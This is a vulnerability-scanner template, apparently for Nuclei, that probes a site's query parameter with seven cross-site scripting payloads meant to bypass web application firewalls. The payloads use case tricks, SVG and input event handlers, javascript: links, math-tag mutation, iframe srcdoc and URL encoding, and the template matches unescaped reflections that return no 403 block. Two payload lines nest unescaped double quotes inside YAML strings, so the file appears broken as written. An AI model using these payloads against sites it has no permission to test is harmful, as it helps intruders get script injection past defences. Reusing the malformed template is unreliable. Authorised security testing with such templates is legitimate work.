id: m7-xss-waf-bypass
info:
  name: M7 - XSS WAF Bypass Techniques
  author: Sharlix
  severity: high
  description: Advanced XSS payloads that bypass common WAF rules (2024-2025 bypass techniques)
  tags: xss,waf,bypass,m7hunter
  reference:
    - https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

requests:
  - method: GET
    path:
      - "{{BaseURL}}?q=<ScRiPt>alert(1)</ScRiPt>"
      - "{{BaseURL}}?q=<svg><animate onbegin=alert(1) attributeName=x>"
      - "{{BaseURL}}?q=<input/onmouseover="alert(1)">"
      - "{{BaseURL}}?q=<a/href=javascript:alert(1)>click"
      - "{{BaseURL}}?q=<math><mtext></p><script>alert(1)</script>"
      - "{{BaseURL}}?q=<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">"
      - "{{BaseURL}}?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "<(ScRiPt|svg|animate|input|iframe|math)[^>]*(alert|onbegin|onmouseover|srcdoc)"
        part: body

      - type: dsl
        dsl:
          - "!contains(body, '&lt;script')"
          - "status_code != 403"
        condition: and
